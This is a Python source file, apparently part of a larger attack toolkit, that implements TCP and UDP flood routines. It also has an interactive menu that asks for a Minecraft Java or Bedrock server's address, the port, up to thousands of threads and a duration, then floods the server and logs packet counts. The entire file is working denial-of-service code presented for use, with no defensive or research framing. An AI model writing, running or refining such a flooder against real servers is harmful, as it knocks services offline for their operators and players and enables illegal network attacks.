import socket
import threading
import random
import time
from modules.utils import pcolor, resolve, check_port
from modules.logger import save_log

def tcp_flood(ip, port, stop, stats):
    while not stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.2)
            s.connect((ip, port))
            s.send(b"\x00" * 64)
            s.close()
            stats['p'] += 1
        except:
            stats['e'] += 1

def udp_flood(ip, port, stop, stats):
    data = random._urandom(1024)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop.is_set():
        try:
            s.sendto(data, (ip, port))
            stats['p'] += 1
        except:
            stats['e'] += 1

def minecraft_attack(edition):
    if edition == "java":
        default_port = 25565
    else:
        default_port = 19132
    
    pcolor("b", f"\n[ MINECRAFT {edition.upper()} ATTACK ]\n")
    target = input("IP or Domain: ")
    
    if not target.replace('.', '').isdigit():
        ip = resolve(target)
        if not ip:
            input("Press Enter...")
            return
    else:
        ip = target
    
    port = int(input(f"Port ({default_port}): ") or default_port)
    
    if check_port(ip, port):
        pcolor("g", f"[+] Server online")
    else:
        pcolor("r", f"[-] Server offline")
        proceed = input("Continue? (y/n): ")
        if proceed != 'y':
            return
    
    print("\n1. TCP Flood\n2. UDP Flood")
    method = input("Select: ")
    threads = int(input("Threads (3000): ") or 3000)
    duration = int(input("Duration sec (60): ") or 60)
    
    print(f"\nTarget: {ip}:{port}")
    print(f"Threads: {threads}")
    print(f"Duration: {duration}s")
    
    confirm = input("\nStart attack? (y/n): ")
    if confirm != 'y':
        return
    
    stop = threading.Event()
    stats = {'p': 0, 'e': 0}
    
    if method == "1":
        attack_func = tcp_flood
        method_name = "TCP_FLOOD"
    else:
        attack_func = udp_flood
        method_name = "UDP_FLOOD"
    
    for _ in range(threads):
        threading.Thread(target=attack_func, args=(ip, port, stop, stats), daemon=True).start()
    
    pcolor("g", f"\n[!] ATTACK STARTED on {ip}:{port}")
    start = time.time()
    
    try:
        while time.time() - start < duration:
            remaining = int(duration - (time.time() - start))
            print(f"\r[LIVE] Packets: {stats['p']} | Errors: {stats['e']} | Time: {remaining}s    ", end="")
            time.sleep(1)
    except KeyboardInterrupt:
        pcolor("y", "\n[!] Stopping...")
    finally:
        stop.set()
        pcolor("g", f"\n\n[+] ATTACK FINISHED")
        print(f"Packets sent: {stats['p']}")
        print(f"Errors: {stats['e']}")
        save_log(ip, port, method_name, threads, duration, stats['p'], stats['e'])
    
    input("\nPress Enter...")
